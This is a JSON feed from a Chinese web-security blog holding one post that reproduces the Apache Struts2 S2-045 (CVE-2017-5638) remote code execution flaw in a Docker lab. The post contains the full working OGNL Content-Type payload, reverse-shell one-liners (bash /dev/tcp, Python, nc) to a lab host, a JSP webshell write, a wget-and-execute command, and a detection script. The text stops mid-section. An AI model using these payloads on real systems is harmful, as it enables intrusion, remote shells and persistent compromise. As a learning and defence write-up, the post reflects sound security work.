{
    "version": "https://jsonfeed.org/version/1",
    "title": "bae的博客 • All posts by \"web安全\" tag",
    "description": "bae的个人博客",
    "home_page_url": "https://bae-ace.github.io",
    "items": [
        {
            "id": "https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "url": "https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "title": "Struts2-045远程代码执行漏洞复现与原理分析",
            "date_published": "2025-07-24T00:10:34.000Z",
            "content_html": "<h1 id=\"Struts2-045远程代码执行漏洞复现与原理分析\"><a href=\"#Struts2-045远程代码执行漏洞复现与原理分析\" class=\"headerlink\" title=\"Struts2-045远程代码执行漏洞复现与原理分析\"></a>Struts2-045远程代码执行漏洞复现与原理分析</h1><h2 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h2><p>Struts2-045（CVE-2017-5638）是Apache Struts2框架中的一个严重远程代码执行漏洞，该漏洞因其影响范围广、利用简单而备受关注。攻击者可以通过构造恶意的Content-Type请求头，在目标服务器上执行任意系统命令。</p>\n<h2 id=\"漏洞基本信息\"><a href=\"#漏洞基本信息\" class=\"headerlink\" title=\"漏洞基本信息\"></a>漏洞基本信息</h2><h3 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h3><ul>\n<li><strong>Apache Struts 2.3.5 - 2.3.31</strong>（包含2.3.31版本）</li>\n<li><strong>Apache Struts 2.5.0 - 2.5.10</strong>（包含2.5.10版本）</li>\n</ul>\n<h3 id=\"漏洞等级\"><a href=\"#漏洞等级\" class=\"headerlink\" title=\"漏洞等级\"></a>漏洞等级</h3><ul>\n<li><strong>CVSS评分</strong>: 10.0（严重）</li>\n<li><strong>漏洞类型</strong>: 远程代码执行（RCE）</li>\n<li><strong>攻击复杂度</strong>: 低</li>\n</ul>\n<h3 id=\"核心原理\"><a href=\"#核心原理\" class=\"headerlink\" title=\"核心原理\"></a>核心原理</h3><p>Struts2框架在处理文件上传请求时，会解析Content-Type请求头。当Content-Type格式不正确时，框架会抛出异常，而<strong>异常处理过程中会对错误信息进行OGNL表达式解析</strong>，这就给了攻击者可乘之机。</p>\n<h2 id=\"技术原理深度分析\"><a href=\"#技术原理深度分析\" class=\"headerlink\" title=\"技术原理深度分析\"></a>技术原理深度分析</h2><h3 id=\"OGNL表达式注入机制\"><a href=\"#OGNL表达式注入机制\" class=\"headerlink\" title=\"OGNL表达式注入机制\"></a>OGNL表达式注入机制</h3><p><strong>OGNL（Object-Graph Navigation Language）</strong> 是Struts2框架使用的表达式语言，用于在Java对象之间进行导航和操作。</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-comment\">// OGNL表达式示例</span><br><span class=\"hljs-selector-id\">#context</span><span class=\"hljs-selector-attr\">[<span class=\"hljs-string\">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span> = false<br>@java<span class=\"hljs-selector-class\">.lang</span>.Runtime@<span class=\"hljs-built_in\">getRuntime</span>()<span class=\"hljs-selector-class\">.exec</span>(<span class=\"hljs-string\">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞触发流程\"><a href=\"#漏洞触发流程\" class=\"headerlink\" title=\"漏洞触发流程\"></a>漏洞触发流程</h3><ol>\n<li><strong>请求接收</strong>: 服务器接收包含恶意Content-Type的HTTP请求</li>\n<li><strong>类型解析</strong>: Struts2尝试解析Content-Type头部信息</li>\n<li><strong>异常触发</strong>: 恶意构造的Content-Type导致解析异常</li>\n<li><strong>错误处理</strong>: 异常处理器对错误信息进行OGNL解析</li>\n<li><strong>代码执行</strong>: 恶意OGNL表达式被执行，实现RCE</li>\n</ol>\n<h3 id=\"关键源码分析\"><a href=\"#关键源码分析\" class=\"headerlink\" title=\"关键源码分析\"></a>关键源码分析</h3><p>漏洞位于<code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest</code>类中：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs typescript\"><span class=\"hljs-comment\">// 简化的漏洞代码逻辑</span><br><span class=\"hljs-keyword\">private</span> <span class=\"hljs-built_in\">void</span> <span class=\"hljs-title function_\">buildErrorMessage</span>(<span class=\"hljs-params\"><span class=\"hljs-title class_\">Throwable</span> e, <span class=\"hljs-title class_\">Object</span>[] args</span>) &#123;<br>    <span class=\"hljs-title class_\">String</span> errorMessage = localizedTextProvider.<span class=\"hljs-title function_\">findDefaultText</span>(e.<span class=\"hljs-title function_\">getMessage</span>(), locale, args);<br>    <span class=\"hljs-comment\">// 这里会对errorMessage进行OGNL表达式解析，导致RCE</span><br>    <span class=\"hljs-keyword\">if</span> (errorMessage != <span class=\"hljs-literal\">null</span>) &#123;<br>        errorMessage = <span class=\"hljs-title class_\">TextParseUtil</span>.<span class=\"hljs-title function_\">translateVariables</span>(errorMessage, stack);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"实验环境搭建\"><a href=\"#实验环境搭建\" class=\"headerlink\" title=\"实验环境搭建\"></a>实验环境搭建</h2><h3 id=\"系统架构\"><a href=\"#系统架构\" class=\"headerlink\" title=\"系统架构\"></a>系统架构</h3><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nix\">┌─ 攻击机（Host）<br>│  └─ Windows<span class=\"hljs-symbol\">/Linux</span> <span class=\"hljs-operator\">+</span> BurpSuite<br>│<br>└─ 靶机（Kali VM）<br>   ├─ <span class=\"hljs-params\">IP:</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.102</span><br>   ├─ Docker <span class=\"hljs-operator\">+</span> Vulhub<br>   └─ Struts2 App (Port <span class=\"hljs-number\">8080</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Docker环境部署\"><a href=\"#Docker环境部署\" class=\"headerlink\" title=\"Docker环境部署\"></a>Docker环境部署</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 1. 克隆Vulhub项目</span><br>git <span class=\"hljs-built_in\">clone</span> https://github.com/vulhub/vulhub.git<br><br><span class=\"hljs-comment\"># 2. 进入S2-045目录</span><br><span class=\"hljs-built_in\">cd</span> vulhub/struts2/s2-045<br><br><span class=\"hljs-comment\"># 3. 启动靶场</span><br>docker-compose up -d<br><br><span class=\"hljs-comment\"># 4. 验证容器状态</span><br>docker ps -a<br></code></pre></td></tr></table></figure>\n\n<p><strong>预期输出</strong>:</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">CONTAINER</span> ID   IMAGE                   COMMAND       CREATED     STATUS      PORTS                    NAMES<br><span class=\"hljs-attribute\">2363a15cda30</span>   vulhub/struts2:<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">30</span>   <span class=\"hljs-string\">&quot;mvn-server&quot;</span> <span class=\"hljs-number\">2</span>min ago   Up <span class=\"hljs-number\">2</span>min     <span class=\"hljs-number\">0.0.0.0:8080</span>-&gt;<span class=\"hljs-number\">8080</span>/tcp  s2-<span class=\"hljs-number\">045</span>-struts2-<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"环境验证\"><a href=\"#环境验证\" class=\"headerlink\" title=\"环境验证\"></a>环境验证</h3><p>访问 <code>http://192.168.56.102:8080/</code> 应该能看到Struts2默认页面。</p>\n<h2 id=\"漏洞利用实战\"><a href=\"#漏洞利用实战\" class=\"headerlink\" title=\"漏洞利用实战\"></a>漏洞利用实战</h2><h3 id=\"Payload构造原理\"><a href=\"#Payload构造原理\" class=\"headerlink\" title=\"Payload构造原理\"></a>Payload构造原理</h3><p>恶意Content-Type的核心结构：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"><span class=\"hljs-attribute\">Content</span>-Type: %&#123;OGNL_EXPRESSION&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"完整攻击载荷\"><a href=\"#完整攻击载荷\" class=\"headerlink\" title=\"完整攻击载荷\"></a>完整攻击载荷</h3><figure class=\"highlight smalltalk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs smalltalk\"><span class=\"hljs-type\">GET</span> / <span class=\"hljs-type\">HTTP</span>/<span class=\"hljs-number\">1.1</span><br><span class=\"hljs-type\">Host</span>: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.102</span>:<span class=\"hljs-number\">8080</span><br><span class=\"hljs-type\">User</span>-<span class=\"hljs-type\">Agent</span>: <span class=\"hljs-type\">Mozilla</span>/<span class=\"hljs-number\">5.0</span> (compatible; <span class=\"hljs-type\">MSIE</span> <span class=\"hljs-number\">9.0</span>; <span class=\"hljs-type\">Windows</span> <span class=\"hljs-type\">NT</span> <span class=\"hljs-number\">6.1</span>; <span class=\"hljs-type\">Win64</span>; x64)<br><span class=\"hljs-type\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,*/*;q=<span class=\"hljs-number\">0.8</span><br><span class=\"hljs-type\">Connection</span>: close<br><span class=\"hljs-type\">Content</span>-<span class=\"hljs-type\">Type</span>: %&#123;<br>    (<span class=\"hljs-symbol\">#nike</span>=<span class=\"hljs-string\">&#x27;multipart/form-data&#x27;</span>).<br>    (<span class=\"hljs-symbol\">#dm</span>=@ognl.<span class=\"hljs-type\">OgnlContext</span>@<span class=\"hljs-type\">DEFAULT_MEMBER_ACCESS</span>).<br>    (<span class=\"hljs-symbol\">#_memberAccess</span>?(<span class=\"hljs-symbol\">#_memberAccess</span>=<span class=\"hljs-symbol\">#dm</span>):(<br>        (<span class=\"hljs-symbol\">#container</span>=<span class=\"hljs-symbol\">#context</span>[<span class=\"hljs-string\">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>=<span class=\"hljs-symbol\">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.<span class=\"hljs-type\">OgnlUtil</span>@class)).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>.getExcludedPackageNames().clear()).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>.getExcludedClasses().clear()).<br>        (<span class=\"hljs-symbol\">#context</span>.setMemberAccess(<span class=\"hljs-symbol\">#dm</span>))<br>    )).<br>    (<span class=\"hljs-symbol\">#cmd</span>=<span class=\"hljs-string\">&#x27;whoami&#x27;</span>).<br>    (<span class=\"hljs-symbol\">#iswin</span>=(@java.lang.<span class=\"hljs-type\">System</span>@getProperty(<span class=\"hljs-string\">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class=\"hljs-string\">&#x27;win&#x27;</span>))).<br>    (<span class=\"hljs-symbol\">#cmds</span>=(<span class=\"hljs-symbol\">#iswin</span>?&#123;<span class=\"hljs-string\">&#x27;cmd.exe&#x27;</span>,<span class=\"hljs-string\">&#x27;/c&#x27;</span>,<span class=\"hljs-symbol\">#cmd</span>&#125;:&#123;<span class=\"hljs-string\">&#x27;/bin/bash&#x27;</span>,<span class=\"hljs-string\">&#x27;-c&#x27;</span>,<span class=\"hljs-symbol\">#cmd</span>&#125;)).<br>    (<span class=\"hljs-symbol\">#p</span>=new java.lang.<span class=\"hljs-type\">ProcessBuilder</span>(<span class=\"hljs-symbol\">#cmds</span>)).<br>    (<span class=\"hljs-symbol\">#p</span>.redirectErrorStream(<span class=\"hljs-keyword\">true</span>)).<br>    (<span class=\"hljs-symbol\">#process</span>=<span class=\"hljs-symbol\">#p</span>.start()).<br>    (<span class=\"hljs-symbol\">#ros</span>=(@org.apache.struts2.<span class=\"hljs-type\">ServletActionContext</span>@getResponse().getOutputStream())).<br>    (@org.apache.commons.io.<span class=\"hljs-type\">IOUtils</span>@copy(<span class=\"hljs-symbol\">#process</span>.getInputStream(),<span class=\"hljs-symbol\">#ros</span>)).<br>    (<span class=\"hljs-symbol\">#ros</span>.flush())<br>&#125;<br><span class=\"hljs-type\">Content</span>-<span class=\"hljs-type\">Length</span>: <span class=\"hljs-number\">0</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Payload逐行解析\"><a href=\"#Payload逐行解析\" class=\"headerlink\" title=\"Payload逐行解析\"></a>Payload逐行解析</h3><table>\n<thead>\n<tr>\n<th>表达式片段</th>\n<th>功能说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>#nike=&#39;multipart/form-data&#39;</code></td>\n<td>设置伪装的Content-Type</td>\n</tr>\n<tr>\n<td><code>#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code></td>\n<td>获取默认成员访问权限</td>\n</tr>\n<tr>\n<td><code>#_memberAccess=#dm</code></td>\n<td>绕过Struts2的安全限制</td>\n</tr>\n<tr>\n<td><code>#container=#context[...]</code></td>\n<td>获取ActionContext容器</td>\n</tr>\n<tr>\n<td><code>#ognlUtil.getExcludedPackageNames().clear()</code></td>\n<td>清除包名黑名单</td>\n</tr>\n<tr>\n<td><code>#ognlUtil.getExcludedClasses().clear()</code></td>\n<td>清除类名黑名单</td>\n</tr>\n<tr>\n<td><code>#cmd=&#39;whoami&#39;</code></td>\n<td>定义要执行的命令</td>\n</tr>\n<tr>\n<td><code>#iswin=...contains(&#39;win&#39;)</code></td>\n<td>判断操作系统类型</td>\n</tr>\n<tr>\n<td><code>#cmds=(#iswin?&#123;...&#125;:&#123;...&#125;)</code></td>\n<td>根据系统类型构造命令参数</td>\n</tr>\n<tr>\n<td><code>#p=new ProcessBuilder(#cmds)</code></td>\n<td>创建进程构建器</td>\n</tr>\n<tr>\n<td><code>#process=#p.start()</code></td>\n<td>启动进程执行命令</td>\n</tr>\n<tr>\n<td><code>IOUtils@copy(...)</code></td>\n<td>将命令输出写入HTTP响应</td>\n</tr>\n</tbody></table>\n<h3 id=\"攻击效果演示\"><a href=\"#攻击效果演示\" class=\"headerlink\" title=\"攻击效果演示\"></a>攻击效果演示</h3><p><strong>请求发送后的响应</strong>:</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-meta\">HTTP/1.1</span> <span class=\"hljs-number\">200</span> OK<br><span class=\"hljs-attribute\">Server</span><span class=\"hljs-punctuation\">: </span>Apache-Coyote/1.1<br><span class=\"hljs-attribute\">Content-Type</span><span class=\"hljs-punctuation\">: </span>text/html;charset=UTF-8<br><span class=\"hljs-attribute\">Content-Length</span><span class=\"hljs-punctuation\">: </span>9<br><span class=\"hljs-attribute\">Date</span><span class=\"hljs-punctuation\">: </span>Wed, 24 Jul 2025 08:30:45 GMT<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br><br><span class=\"language-haskell\"><span class=\"hljs-title\">www</span>-<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span></span></span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"高级利用技巧\"><a href=\"#高级利用技巧\" class=\"headerlink\" title=\"高级利用技巧\"></a>高级利用技巧</h2><h3 id=\"1-信息收集命令\"><a href=\"#1-信息收集命令\" class=\"headerlink\" title=\"1. 信息收集命令\"></a>1. 信息收集命令</h3><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autoit\"><span class=\"hljs-meta\"># 系统信息</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;uname -a&#x27;</span></span><br><br><span class=\"hljs-meta\"># 当前用户</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;id&#x27;</span></span><br><br><span class=\"hljs-meta\"># 网络配置</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ifconfig&#x27;</span></span><br><br><span class=\"hljs-meta\"># 进程列表</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ps aux&#x27;</span></span><br><br><span class=\"hljs-meta\"># 文件系统</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ls -la /&#x27;</span></span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-反弹Shell\"><a href=\"#2-反弹Shell\" class=\"headerlink\" title=\"2. 反弹Shell\"></a>2. 反弹Shell</h3><figure class=\"highlight hsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs hsp\"><span class=\"hljs-meta\"># Bash反弹Shell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;bash -i &gt;&amp; /dev/tcp/<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">4444</span> <span class=\"hljs-number\">0</span>&gt;&amp;<span class=\"hljs-number\">1</span>&#x27;</span><br><br><span class=\"hljs-meta\"># Python反弹Shell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;python -c <span class=\"hljs-string\">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;192.168.56.1\\&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&quot;</span>&#x27;</span><br><br><span class=\"hljs-meta\"># NC反弹Shell  </span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;nc -e /bin/sh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span> <span class=\"hljs-number\">4444</span>&#x27;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-文件操作\"><a href=\"#3-文件操作\" class=\"headerlink\" title=\"3. 文件操作\"></a>3. 文件操作</h3><figure class=\"highlight hsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs hsp\"><span class=\"hljs-meta\"># 读取敏感文件</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;cat /etc/passwd&#x27;</span><br><br><span class=\"hljs-meta\"># 写入WebShell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;echo <span class=\"hljs-string\">&quot;&lt;%@ page import=\\&quot;java.io.*\\&quot; %&gt;&lt;% String cmd = request.getParameter(\\&quot;cmd\\&quot;); Process p = Runtime.getRuntime().exec(cmd); %&gt;&quot;</span> &gt; /tmp/shell.jsp&#x27;</span><br><br><span class=\"hljs-meta\"># 下载文件</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;wget http:<span class=\"hljs-comment\">//192.168.56.1:8000/shell.sh -O /tmp/shell.sh &amp;&amp; chmod +x /tmp/shell.sh &amp;&amp; /tmp/shell.sh&#x27;</span></span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"检测与防护\"><a href=\"#检测与防护\" class=\"headerlink\" title=\"检测与防护\"></a>检测与防护</h2><h3 id=\"漏洞检测脚本\"><a href=\"#漏洞检测脚本\" class=\"headerlink\" title=\"漏洞检测脚本\"></a>漏洞检测脚本</h3><figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs livescript\"><span class=\"hljs-comment\">#!/usr/bin/env python3</span><br><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> sys<br><br>def check_s2_045(url):<br>    payload = <span class=\"hljs-string\">&quot;&quot;&quot;%&#123;</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#nike</span>=&#x27;multipart/form-data&#x27;).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#_memberAccess</span>?(<span class=\"hljs-subst\">#_memberAccess</span>=<span class=\"hljs-subst\">#dm</span>):(</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#container</span>=<span class=\"hljs-subst\">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>=<span class=\"hljs-subst\">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>.getExcludedPackageNames().clear()).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>.getExcludedClasses().clear()).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#context</span>.setMemberAccess(<span class=\"hljs-subst\">#dm</span>))</span><br><span class=\"hljs-string\">        )).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#cmd</span>=&#x27;echo &quot;S2045_VULN_TEST&quot;&#x27;).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#cmds</span>=(<span class=\"hljs-subst\">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class=\"hljs-subst\">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class=\"hljs-subst\">#cmd</span>&#125;)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#p</span>=new java.lang.ProcessBuilder(<span class=\"hljs-subst\">#cmds</span>)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#p</span>.redirectErrorStream(true)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#process</span>=<span class=\"hljs-subst\">#p</span>.start()).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).</span><br><span class=\"hljs-string\">        (@org.apache.commons.io.IOUtils@copy(<span class=\"hljs-subst\">#process</span>.getInputStream(),<span class=\"hljs-subst\">#ros</span>)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#ros</span>.flush())</span><br><span class=\"hljs-string\">    &#125;&quot;&quot;&quot;</span><br>    <br>    headers = &#123;<br>        <span class=\"hljs-string\">&#x27;Content-Type&#x27;</span>: payload,<br>        <span class=\"hljs-string\">&#x27;User-Agent&#x27;</span>: <span class=\"hljs-string\">&#x27;Mozilla/5.0 (compatible; S2-045-Scanner)&#x27;</span><br>    &#125;<br>    <br>    try:<br>        response = requests.get(url, headers=headers, timeout=<span class=\"hljs-number\">10</span>)<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;S2045_VULN_TEST&quot;</span> <span class=\"hljs-keyword\">in</span> response.text:<br>            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[+] &#123;url&#125; is vulnerable to S2-045!&quot;</span>)<br>            <span class=\"hljs-keyword\">return</span> True<br>        else:<br>            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[-] &#123;url&#125; is not vulnerable to S2-045&quot;</span>)<br>            <span class=\"hljs-keyword\">return</span> False<br>    except Exception <span class=\"hljs-keyword\">as</span> e:<br>        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[!] Error testing &#123;url&#125;: &#123;str(e)&#125;&quot;</span>)<br>        <span class=\"hljs-keyword\">return</span> False<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&quot;__main__&quot;</span>:<br>    <span class=\"hljs-keyword\">if</span> len(sys.argv) != <span class=\"hljs-number\">2</span>:<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Usage: python3 s2-045-check.py &lt;URL&gt;&quot;</span>)<br>        sys.exit(<span class=\"hljs-number\">1</span>)<br>    <br>    target_url = sys.argv[<span class=\"hljs-number\">1</span>]<br>    check_s2_045(target_url)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"安全防护措施\"><a href=\"#安全防护措施\" class=\"headerlink\" title=\"安全防护措施\"></a>安全防护措施</h3><h4 id=\"1-版本升级（根本解决方案）\"><a href=\"#1-版本升级（根本解决方案）\" class=\"headerlink\" title=\"1. 版本升级（根本解决方案）\"></a>1. 版本升级（根本解决方案）</h4><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-comment\"># 升级到安全版本</span><br><span class=\"hljs-attribute\">Apache</span> Struts <span class=\"hljs-number\">2</span>.<span 